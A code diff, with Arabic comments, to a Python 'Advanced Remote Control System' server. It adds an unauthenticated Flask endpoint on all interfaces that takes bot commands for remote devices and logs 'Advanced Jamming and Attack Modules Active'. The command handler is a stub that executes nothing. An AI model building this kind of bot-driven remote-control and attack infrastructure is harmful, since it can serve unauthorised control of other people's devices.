@@ -112,6 +112,62 @@ from ai_analysis_module import AIAnalysisModule
 from ai_recommendation_module import AIRecommendationModule
 from ai_threat_monitoring_module import AIThreatMonitoringModule
 
+# إضافة خادم HTTP بسيط للتواصل مع البوت
+from flask import Flask, request, jsonify
+import threading
+
+# إنشاء تطبيق Flask
+app = Flask(__name__)
+
+@app.route('/status')
+def status():
+    """فحص حالة الخادم"""
+    return jsonify({
+        'status': 'running',
+        'server': 'Advanced Remote Control System',
+        'version': '1.0.0',
+        'websocket_port': 8080,
+        'http_port': 10001
+    })
+
+@app.route('/command', methods=['POST'])
+def command():
+    """استقبال الأوامر من البوت"""
+    try:
+        data = request.json
+        device_id = data.get('client_id')
+        command = data.get('command')
+        parameters = data.get('parameters', {})
+        
+        # معالجة الأمر
+        result = {
+            'status': 'success',
+            'device_id': device_id,
+            'command': command,
+            'result': f'تم تنفيذ الأمر: {command}',
+            'timestamp': time.time()
+        }
+        
+        logger.info(f"تم استقبال أمر من البوت: {command} للجهاز {device_id}")
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"خطأ في معالجة الأمر: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/client-status/<device_id>')
+def client_status(device_id):
+    """حالة الجهاز"""
+    return jsonify({
+        'device_id': device_id,
+        'status': 'connected',
+        'last_seen': time.time()
+    })
+
+def run_http_server():
+    """تشغيل خادم HTTP"""
+    app.run(host='0.0.0.0', port=10001, debug=False, use_reloader=False)
+
 @dataclass
 class ServerConfig:
     """Server configuration"""
@@ -1001,11 +1057,29 @@ def main():
     server = AdvancedRemoteControlServer(config)
     
     try:
-        asyncio.run(server.start_server())
+        # تشغيل خادم HTTP في خيط منفصل
+        http_thread = threading.Thread(target=run_http_server, daemon=True)
+        http_thread.start()
+        
+        # انتظار قليل لبدء خادم HTTP
+        time.sleep(2)
+        
+        # تشغيل خادم WebSocket
+        start_server = websockets.serve(server._handle_client, "0.0.0.0", 8080)
+        
+        server.logger.info("✅ جميع الوحدات تم تهيئتها بنجاح")
+        server.logger.info("Server started on 0.0.0.0:8080")
+        server.logger.info("HTTP Server started on 0.0.0.0:10001")
+        server.logger.info("Phase 4: Advanced Jamming and Attack Modules Active")
+        
+        asyncio.get_event_loop().run_until_complete(start_server)
+        asyncio.get_event_loop().run_forever()
+        
     except KeyboardInterrupt:
         print("\nServer stopped by user")
     except Exception as e:
-        print(f"Server error: {str(e)}")
+        server.logger.error(f"Error starting server: {e}")
+        print(f"Server error: {e}")
 
 if __name__ == "__main__":
     main()
